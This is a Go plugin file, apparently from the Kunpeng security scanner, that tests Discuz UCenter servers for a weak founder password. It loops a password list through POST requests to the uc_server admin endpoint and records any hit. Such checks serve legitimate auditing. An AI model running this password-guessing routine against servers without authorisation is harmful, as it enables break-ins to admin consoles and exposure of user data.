package goplugin

import (
	"fmt"
	"net/http"
	"strings"
	"github.com/opensec-cn/kunpeng/util"
	"github.com/opensec-cn/kunpeng/plugin"
)

type ucServerWeak struct {
	info   plugin.PluginInfo
	result []plugin.PluginInfo
}

func init() {
	plugin.Regist("discuz", &ucServerWeak{})
}
func (d *ucServerWeak) Init() plugin.PluginInfo{
	d.info = plugin.PluginInfo{
		Name:    "UcServer 创始人弱口令",
		Remarks: "攻击者通过此漏洞可以登陆管理控制台，后台可查看修改所有用户信息，且部分版本可能存在命令执行漏洞。",
		Level:   0,
		Type:    "WEAK",
		Author:   "wolf",
		References: plugin.References{
			URL: "",
			CVE: "",
		},
	}
	return d.info
}
func (d *ucServerWeak) GetResult() []plugin.PluginInfo {
	return d.result
}
func (d *ucServerWeak) Check(URL string, meta plugin.TaskMeta) bool {
	for _, pass := range PassList {
		// pass = strings.Replace(pass, "{user}", "administrator", -1)
		request, err := http.NewRequest("POST", URL+"/uc_server/index.php?m=app&a=add", strings.NewReader("ucfounderpw="+pass))
		request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		resp, err := util.RequestDo(request, true)
		if err != nil {
			return false
		}
		if resp.Other.StatusCode == 404 {
			return false
		}
		if strings.Contains(resp.ResponseRaw, "|") && resp.Other.ContentLength > 10 && resp.Other.ContentLength < 300 {
			result := d.info
			result.Response = resp.ResponseRaw
			result.Request = resp.RequestRaw
			result.Remarks = fmt.Sprintf("弱口令：%s,%s", pass, result.Remarks)
			d.result = append(d.result, result)
			return true
		}
	}
	return false
}
